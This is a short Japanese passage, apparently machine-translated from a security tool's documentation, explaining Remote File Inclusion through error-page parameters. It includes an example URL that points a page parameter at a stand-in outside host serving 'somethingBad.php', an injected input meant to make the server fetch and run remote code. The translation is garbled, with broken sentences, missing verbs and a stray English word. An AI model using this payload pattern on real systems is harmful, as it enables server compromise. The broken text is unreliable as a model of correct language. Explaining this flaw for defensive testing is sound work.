Web アプリケーションは、パラメータ値を使用して、
後でサーバーで必要になるファイルの場所。

An
この例はエラー ページでよく見られます。実際のファイル
エラー ページのパスはパラメータ値に保存されます。たとえば、
「example.com/error.php?page=404.php」。

リモート ファイル インクルードが発生する
パラメータ値 (つまり、サーバーによって呼び出されるファイルへのパス) がいつ
は、リモート リソースのアドレスに置き換えることができます。例:
`yoursite.com/error.asp?page=http://anothersite.com/somethingBad.php`
場合によっては、サーバーはフェッチされたリソースを処理します。
したがって、リソースに次のものと一致するサーバー側コードが含まれている場合、
使用されているフレームワーク (ASP、PHP、JSP など) により、おそらく
リソースは Web の一部であるかのように実行されます
応用。

ツールは、
パラメータ値を外部リソースに設定し、サーバーに取得させます。
そしてその内容を応答に含めます。